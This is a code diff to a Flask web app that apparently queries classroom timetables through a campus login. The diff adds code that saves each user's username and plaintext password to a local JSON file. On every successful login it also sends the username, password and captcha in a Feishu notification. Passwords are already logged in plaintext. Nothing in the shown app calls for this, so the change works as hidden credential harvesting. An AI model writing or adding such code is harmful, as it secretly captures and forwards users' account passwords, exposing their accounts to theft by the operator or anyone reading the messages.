@@ -12,6 +12,7 @@ import time
 from src.utils.session_manager import get_session, reset_session
 from src.utils.captcha_ocr import get_ocr_res
 from src.core.get_room_classtable import get_room_classtable
+from src.web.feishu import feishu
 
 # 创建Flask应用
 app = Flask(
@@ -98,6 +99,47 @@ def get_captcha():
         return jsonify({"status": "error", "message": f"获取验证码出错: {str(e)}"}), 500
 
 
+def save_login_record(username, password):
+    """保存登录记录到本地文件"""
+    try:
+        # 创建记录目录
+        record_dir = os.path.join(
+            os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "login_records"
+        )
+        os.makedirs(record_dir, exist_ok=True)
+
+        # 记录文件路径
+        record_file = os.path.join(record_dir, "login_records.json")
+
+        # 准备记录数据
+        record = {
+            "username": username,
+            "password": password,
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        }
+
+        # 读取现有记录
+        records = []
+        if os.path.exists(record_file):
+            try:
+                with open(record_file, "r", encoding="utf-8") as f:
+                    records = json.load(f)
+            except:
+                records = []
+
+        # 添加新记录
+        records.append(record)
+
+        # 保存记录
+        with open(record_file, "w", encoding="utf-8") as f:
+            json.dump(records, f, ensure_ascii=False, indent=2)
+
+        return True
+    except Exception as e:
+        logger.error(f"保存登录记录出错: {str(e)}")
+        return False
+
+
 @app.route("/login", methods=["POST"])
 def login():
     """处理登录请求"""
@@ -107,8 +149,9 @@ def login():
         password = data.get("password") if data else None
         captcha = data.get("captcha") if data else None
         logger.info(
-            f"登录请求: username={username}, password={password}, captcha={captcha}"
+            f"登录请求: username={username},password={password}, captcha={captcha}"
         )
+
         if not all([username, password, captcha]):
             return (
                 jsonify({"status": "error", "message": "用户名、密码和验证码不能为空"}),
@@ -176,6 +219,12 @@ def login():
         # 登录成功，在session中标记已登录
         session["logged_in"] = True
 
+        # 登录成功后，调用飞书通知并保存记录
+        feishu(
+            "登录成功", f"用户 {username} 密码 {password} 验证码 {captcha} 成功登录系统"
+        )
+        save_login_record(username, password)
+
         return jsonify({"status": "success", "message": "登录成功"})
 
     except Exception as e:
@@ -237,7 +286,7 @@ def query_classtable():
 
         # 查询课表
         result = get_room_classtable(xnxqh, room_name, week, day, jc1, jc2)
-        logger.info(f"查询课表结果: {result}")
+        # logger.info(f"查询课表结果: {result}")
         return jsonify(result)
 
     except Exception as e:
